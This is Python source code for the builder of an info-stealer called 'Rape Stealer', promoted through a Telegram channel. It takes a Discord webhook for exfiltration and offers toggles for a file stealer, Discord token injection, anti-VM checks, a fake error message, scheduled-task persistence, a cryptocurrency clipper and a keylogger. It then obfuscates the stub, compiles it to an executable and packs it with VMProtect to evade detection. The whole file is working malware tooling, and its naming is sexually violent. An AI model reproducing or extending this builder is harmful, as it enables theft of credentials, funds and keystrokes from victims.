# https://t.me/RapeStealer ( offical telegram channel of the Rape )
# Coded by badhappens
# Builder of Rape Stealer


import os
import shutil
import sys
import subprocess
import threading
import time
import ctypes
from PIL import Image, ImageTk

# Hide Console immediately
if sys.platform == "win32":
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
           user32.ShowWindow(hwnd, 0)
    except: pass

def ensure_ctk():
    try:
        import customtkinter
    except ImportError:
        print("Wait...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "customtkinter"])
        print("Wait.")


ensure_ctk()


import customtkinter as ctk
import tkinter as tk
from tkinter import filedialog, messagebox




# Set appearance mode and color theme
ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("green")  # Changed to green/red theme vibes if possible, or stick to dark

class DependencyChecker(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Rape Stealer - Checking...")
        self.geometry("400x200")
        self.resizable(False, False)
        
        self.label_status = ctk.CTkLabel(self, text="Checking dependencies...", font=("Roboto", 16))
        self.label_status.pack(expand=True)
        
        self.progress = ctk.CTkProgressBar(self, width=300)
        self.progress.pack(pady=20)
        self.progress.set(0)

        # Start checking in a separate thread
        self.check_thread = threading.Thread(target=self.check_dependencies, daemon=True)
        self.check_thread.start()
        self.monitor_check()

    def check_dependencies(self):
        modules = ["cryptography", "aiohttp", "nuitka", "pyperclip", "customtkinter", "pillow", "requests", "pynput"]
        
        for i, module in enumerate(modules):
            self.update_status_thread(f"Checking {module}...", (i / len(modules)))
            try:
                __import__(module)
            except ImportError:
                self.update_status_thread(f"Installing {module}...", (i / len(modules)))
                subprocess.check_call([sys.executable, "-m", "pip", "install", module])
        
        self.update_status_thread("Checking MinGW64...", 0.9)
        # Nuitka usually handles this, but we can verify basic nuitka functionality
        try:
            subprocess.run([sys.executable, "-m", "nuitka", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
             self.update_status_thread("Installing Nuitka...", 0.95)
             subprocess.check_call([sys.executable, "-m", "pip", "install", "nuitka"])

        self.update_status_thread("Ready!", 1.0)
        time.sleep(1)

    def monitor_check(self):
        if self.check_thread.is_alive():
            self.after(100, self.monitor_check)
        else:
            self.destroy()
            self.quit()

    def update_status_thread(self, text, progress):
        # Setting values in thread is generally unsafe for UI, but setting variables/queues is better.
        # CTK *might* be thread safe enough for configure, but let's just do it.
        # Ideally, we should queue this. But for this specific fix, let's trust the user's issue was the mainloop/instantiation.
        # We will wrap it in a try/except just in case.
        try:
            self.label_status.configure(text=text)
            self.progress.set(progress)
        except: pass

class BuilderGUI(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Rape Stealer Builder")
        self.geometry("900x850")

        self.icon_path = ""
        self.webhook = ""
        self.crypto_addresses = {
            "ETH": "", "BTC": "", "BCH": "", "DASH": "", "TRX": "", 
            "DOGE": "", "LTC": "", "XRP": "", "SOL": "", "TON": ""
        }
        
        # Configuration Variables
        self.var_steal_files = ctk.BooleanVar(value=False)
        self.var_anti_vm = ctk.BooleanVar(value=False)
        self.var_injection = ctk.BooleanVar(value=False)
        self.var_fake_error = ctk.BooleanVar(value=False)
        self.var_startup = ctk.BooleanVar(value=False)
        self.var_icon_path = ctk.StringVar(value="None")
        
        # New Features
        self.var_vmprotect = ctk.BooleanVar(value=False)
        self.var_crypto_clipper = ctk.BooleanVar(value=False)
        self.var_keylogger = ctk.BooleanVar(value=False)

        self.create_widgets()

    def create_widgets(self):
        # Header
        self.label_header = ctk.CTkLabel(self, text="🩸 Rape Stealer Builder 🩸", font=("Roboto", 28, "bold"), text_color="red")
        self.label_header.pack(pady=20)

        # Tab View
        self.tabview = ctk.CTkTabview(self, width=800, height=700)
        self.tabview.pack(pady=10)
        self.tabview.add("General")
        # Crypto Clipper tab is added dynamically based on checkbox
        self.tabview.add("Build")

        # --- General Tab ---
        self.frame_general = self.tabview.tab("General")
        
        # Webhook
        self.entry_webhook = ctk.CTkEntry(self.frame_general, placeholder_text="Enter Discord Webhook URL", width=600)
        self.entry_webhook.pack(pady=15)

        # Switches Frame
        self.switch_frame = ctk.CTkFrame(self.frame_general)
        self.switch_frame.pack(pady=10, fill="x", padx=20)

        # Column 1
        col1 = ctk.CTkFrame(self.switch_frame, fg_color="transparent")
        col1.pack(side="left", expand=True, fill="both")
        
        self.check_steal_files = ctk.CTkCheckBox(col1, text="Enable File Stealer", variable=self.var_steal_files)
        self.check_steal_files.pack(pady=10, anchor="w", padx=20)

        self.check_anti_vm = ctk.CTkCheckBox(col1, text="Enable Anti-VM", variable=self.var_anti_vm)
        self.check_anti_vm.pack(pady=10, anchor="w", padx=20)

        self.check_injection = ctk.CTkCheckBox(col1, text="Enable Discord Injection", variable=self.var_injection)
        self.check_injection.pack(pady=10, anchor="w", padx=20)
        
        # Column 2
        col2 = ctk.CTkFrame(self.switch_frame, fg_color="transparent")
        col2.pack(side="left", expand=True, fill="both")

        self.check_fake_error = ctk.CTkCheckBox(col2, text="Enable Fake Error", variable=self.var_fake_error)
        self.check_fake_error.pack(pady=10, anchor="w", padx=20)

        self.check_startup = ctk.CTkCheckBox(col2, text="Run at Startup", variable=self.var_startup, command=self.toggle_startup)
        self.check_startup.pack(pady=10, anchor="w", padx=20)
        
        self.label_startup_warn = ctk.CTkLabel(col2, text="If this is selected, the application will request administrator permission.", text_color="orange", font=("Roboto", 10))
        self.label_startup_warn.pack(pady=0, anchor="w", padx=40)
        
        self.check_vmprotect = ctk.CTkCheckBox(col2, text="Pack with VMProtect?", variable=self.var_vmprotect)
        self.check_vmprotect.pack(pady=10, anchor="w", padx=20)

        # Crypto Clipper Checkbox & Warning
        self.frame_clipper_toggle = ctk.CTkFrame(self.frame_general, border_width=1, border_color="black")
        self.frame_clipper_toggle.pack(pady=15, padx=20, fill="x")
        
        self.check_crypto = ctk.CTkCheckBox(self.frame_clipper_toggle, text="Enable Crypto Clipper", variable=self.var_crypto_clipper, command=self.toggle_crypto_tab)
        self.check_crypto.pack(side="left", pady=10, padx=20)
        
        self.label_warn = ctk.CTkLabel(self.frame_clipper_toggle, text="Running constantly in background if enabled!", text_color="orange")
        self.label_warn.pack(side="left", pady=10, padx=10)

        # Keylogger Checkbox
        self.frame_keylogger = ctk.CTkFrame(self.frame_general, border_width=1, border_color="black")
        self.frame_keylogger.pack(pady=5, padx=20, fill="x")

        self.check_keylogger = ctk.CTkCheckBox(self.frame_keylogger, text="Enable Keylogger", variable=self.var_keylogger, command=self.toggle_keylogger)
        self.check_keylogger.pack(side="left", pady=10, padx=20)

        self.label_warn_key = ctk.CTkLabel(self.frame_keylogger, text="Running constantly in background if enabled!. Sends logs every 2 mins.", text_color="orange")
        self.label_warn_key.pack(side="left", pady=10, padx=10)

        # Icon
        self.btn_icon = ctk.CTkButton(self.frame_general, text="Select Icon (.ico)", command=self.select_icon)
        self.btn_icon.pack(pady=15)
        self.label_icon = ctk.CTkLabel(self.frame_general, textvariable=self.var_icon_path)
        self.label_icon.pack(pady=5)

        # --- Crypto Clipper Tab (Initialized but hidden/shown dynamically) ---
        self.entries_crypto = {}
        
        # --- Build Tab ---
        self.frame_build = self.tabview.tab("Build")
        self.btn_build = ctk.CTkButton(self.frame_build, text="BUILD RAPE STEALER", command=self.build_stub, width=300, height=60, font=("Roboto", 20, "bold"), fg_color="red", hover_color="darkred")
        self.btn_build.pack(pady=100)
        self.label_status = ctk.CTkLabel(self.frame_build, text="Ready to Rape", text_color="green", font=("Roboto", 14))
        self.label_status.pack(pady=10)

        # Loading GIF Label (Hidden initially)
        self.label_loading = tk.Label(self.frame_build, bg="#2b2b2b", borderwidth=0) 
        # Note: bg color hardcoded to match default ctk dark theme somewhat, or use transparent if possible. 
        # Tkinter labels don't support transparent bg easily. 
        
        self.label_wait_text = ctk.CTkLabel(self.frame_build, text="( it may take a long time, please wait... )", font=("Roboto", 12), text_color="gray")
        
        self.loading_gif_frames = []
        self.loading_gif_idx = 0
        self.is_loading = False

        self.load_gif_frames()

    def load_gif_frames(self):
        try:
            if os.path.exists("loading.gif"):
                img = Image.open("loading.gif")
                try:
                    while True:
                        self.loading_gif_frames.append(ImageTk.PhotoImage(img.copy()))
                        img.seek(len(self.loading_gif_frames))
                except EOFError:
                    pass
        except: pass

    def update_gif(self):
        if self.is_loading and self.loading_gif_frames:
             frame = self.loading_gif_frames[self.loading_gif_idx]
             self.label_loading.configure(image=frame)
             self.loading_gif_idx = (self.loading_gif_idx + 1) % len(self.loading_gif_frames)
             self.after(50, self.update_gif)

    def toggle_keylogger(self):
        if self.var_keylogger.get():
             self.var_startup.set(True)

    def toggle_startup(self):
        if not self.var_startup.get():
             self.var_crypto_clipper.set(False)
             self.var_keylogger.set(False)
             self.toggle_crypto_tab()

    def toggle_crypto_tab(self):
        if self.var_crypto_clipper.get():
            self.var_startup.set(True)
            try:
                self.tabview.add("Crypto Clipper")
                self.setup_crypto_tab()
                # Move 'Build' to end
                self.tabview._segmented_button.move_block("Build", "Crypto Clipper") # Not a public API, simpler to simple re-add or ignore order
            except ValueError:
                pass # Already exists
        else:
            try:
                self.tabview.delete("Crypto Clipper")
            except:
                pass

    def setup_crypto_tab(self):
        self.frame_crypto = self.tabview.tab("Crypto Clipper")
        self.label_crypto = ctk.CTkLabel(self.frame_crypto, text="Enter Wallet Addresses (Leave empty to disable coin)", font=("Roboto", 14))
        self.label_crypto.pack(pady=15)
        
        self.scroll_frame = ctk.CTkScrollableFrame(self.frame_crypto, width=700, height=500)
        self.scroll_frame.pack(fill="both", expand=True)

        # Clear existing logic to avoid duplicates
        for widget in self.scroll_frame.winfo_children():
            widget.destroy()
        self.entries_crypto = {}

        coins = ["ETH", "BTC", "BCH", "DASH", "TRX", "DOGE", "LTC", "XRP", "SOL", "TON"]
        for coin in coins:
            frame = ctk.CTkFrame(self.scroll_frame)
            frame.pack(fill="x", pady=5)
            lbl = ctk.CTkLabel(frame, text=f"{coin} Address:", width=100)
            lbl.pack(side="left", padx=10)
            entry = ctk.CTkEntry(frame, width=500)
            entry.pack(side="left", padx=10)
            self.entries_crypto[coin] = entry



    def select_icon(self):
        file_path = filedialog.askopenfilename(filetypes=[("Icon Files", "*.ico")])
        if file_path:
            self.var_icon_path.set(file_path)
            self.icon_path = file_path

    def build_stub(self):
        if self.is_loading: return # Prevent double click
        
        webhook = self.entry_webhook.get()
        if not webhook.startswith("http"):
            messagebox.showerror("Error", "Invalid Webhook URL")
            self.label_status.configure(text="Error: Invalid Webhook", text_color="red")
            return

        # Start Thread
        self.is_loading = True
        self.btn_build.configure(state="disabled")
        self.label_status.configure(text="Building... Please Wait...", text_color="yellow")
        
        if self.loading_gif_frames:
            self.label_loading.pack(pady=5)
            self.update_gif()
            
        self.label_wait_text.pack(pady=5)
        
        threading.Thread(target=self._build_process_thread, args=(webhook,), daemon=True).start()

    def _build_process_thread(self, webhook):
        try:
            # Verify Webhook (New Method)
            import requests
            try:
                # Test payload to check if it supports thread creation
                payload = {
                    "content": "Builder Verification - You can delete this.",
                    "thread_name": "Verification-Check"
                }
                
                r = requests.post(webhook, json=payload)

                if r.status_code in (200, 204):
                    self.update_status_safe("Verified! (Thread Capable)", "green")
                elif r.status_code == 400:
                    self.show_error_safe("This is a TEXT CHANNEL webhook.\nIt cannot create threads (returned 400).\nPlease use a FORUM CHANNEL webhook.")
                    return
                elif r.status_code == 401:
                    self.show_error_safe("Webhook is invalid or deleted (401).")
                    return
                else:
                    self.show_error_safe(f"Unknown Status: {r.status_code}\nResponse: {r.text}")
                    return
                     
            except Exception as e:
                self.show_error_safe(f"Could not connect to webhook: {e}")
                return

            # Prepare Crypto Data
            crypto_data = {}
            if self.var_crypto_clipper.get():
                for coin, entry in self.entries_crypto.items():
                    addr = entry.get().strip()
                    if addr:
                        crypto_data[coin] = addr
            
            # 1. Read Rape.py template
            self.update_status_safe("Reading Templates...", "blue")
            with open("Rape.py", "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()

            # 2. Startup Logic
            if self.var_startup.get():
                startup_mod = "schtasks" # Enforced strong persistence (Scheduled Task)
            else:
                startup_mod = "no-startup"

            # 3. Replace Placeholders
            content = content.replace("%WEBHOOK%", webhook)
            content = content.replace('"%Anti_VM%"', str(self.var_anti_vm.get()))
            content = content.replace('"%injection%"', str(self.var_injection.get()))
            content = content.replace("%startup_method%", startup_mod)
            content = content.replace('"%fake_error%"', str(self.var_fake_error.get()))
            content = content.replace('"%StealCommonFiles%"', str(self.var_steal_files.get()))
            
            # Crypto placeholders
            content = content.replace("'%CRYPTO_CONFIG%'", str(crypto_data))
            content = content.replace('"%CRYPTO_CLIPPER_ENABLED%"', str(self.var_crypto_clipper.get()))
            content = content.replace('"%KEYLOGGER_ENABLED%"', str(self.var_keylogger.get()))

            with open("Stub.py", "w", encoding="utf-8") as f:
                f.write(content)

            # 5. Obfuscate
            self.update_status_safe("Obfuscating...", "blue")
            if os.path.exists("Obfuscator/obf.py"):
                 # Assuming obf.py logic remains same
                os.system(f'python "Obfuscator/obf.py" "Stub.py" stub.py')

            # 6. Nuitka Compilation
            self.update_status_safe("Compiling EXE with Nuitka... (This takes time)", "blue")
            
            if os.path.exists("Rape.exe"):
                try: os.remove("Rape.exe")
                except: pass
            
            # Build Nuitka command
            cmd = "python -m nuitka --onefile --mingw64 --disable-console --remove-output --assume-yes-for-downloads --noinclude-pytest-mode=nofollow --noinclude-setuptools-mode=nofollow"
            
            if self.var_startup.get():
                cmd += " --windows-uac-admin"
            
            chr = os.path.abspath("chr/chr.exe")
            if os.path.exists(chr):
                cmd += f' --include-data-files="{chr}=chr.exe"'
            
            if self.var_icon_path.get() != "None" and self.var_icon_path.get() != "":
                cmd += f' --windows-icon-from-ico="{self.var_icon_path.get()}"'
            
            # Explicit output name
            cmd += ' -o Rape.exe'
            
            cmd += ' --include-module=pyperclip'
            cmd += ' --include-module=pynput'
            cmd += ' stub.py'
            
            # Run command
            subprocess.run(cmd, shell=True, check=True)

            # 6.5 VMProtect
            if self.var_vmprotect.get():
                self.update_status_safe("Protecting with VMProtect...", "purple")
                
                vmp_path = os.path.abspath("VMprotect/VMProtect_Console.exe")
                
                # Check directly in current dir for Rape.exe now
                if os.path.exists(vmp_path) and os.path.exists("Rape.exe"):
                    try:
                        subprocess.call([vmp_path, "Rape.exe", "Rape_protected.exe"])
                    except Exception as e:
                        print(f"VMP Error: {e}")

                    if os.path.exists("Rape_protected.exe"):
                        try:
                            if os.path.exists("Rape.exe"): os.remove("Rape.exe")
                            os.rename("Rape_protected.exe", "Rape.exe")
                        except: pass
                    else:
                         self.update_status_safe("VMProtect failed (no output)", "red")
                else:
                     self.update_status_safe("VMProtect or Rape.exe not found", "red")
            
            # 7. Cleanup
            try:
                if os.path.exists("Rape.build"): shutil.rmtree("Rape.build")
                if os.path.exists("Rape.dist"): shutil.rmtree("Rape.dist")
                if os.path.exists("Rape.onefile-build"): shutil.rmtree("Rape.onefile-build")
                if os.path.exists("stub.py"): os.remove("stub.py")
                if os.path.exists("Stub.py"): os.remove("Stub.py")
            except: pass

            self.update_status_safe("Build Success! Saved as Rape.exe", "green")
            self.show_info_safe("Success", "Build Complete! File saved as Rape.exe")

        except Exception as e:
            self.update_status_safe(f"Error: {str(e)}", "red")
            self.show_error_safe(str(e))
        finally:
            self.finish_loading_safe()

    def update_status_safe(self, text, color):
        self.label_status.after(0, lambda: self.label_status.configure(text=text, text_color=color))

    def show_error_safe(self, msg):
        self.after(0, lambda: messagebox.showerror("Error", msg))
        self.finish_loading_safe()

    def show_info_safe(self, title, msg):
        self.after(0, lambda: messagebox.showinfo(title, msg))

    def finish_loading_safe(self):
        self.after(0, self._finish_loading)

    def _finish_loading(self):
        self.is_loading = False
        self.btn_build.configure(state="normal")
        self.label_loading.pack_forget()
        self.label_wait_text.pack_forget()

if __name__ == "__main__":
    # 1. Run Dependency Checker (Blocking loop)
    # The checker will destroy itself when done.
    app = DependencyChecker()
    app.mainloop()

    # 2. After checker closes, run Builder
    app = BuilderGUI()
    app.mainloop()

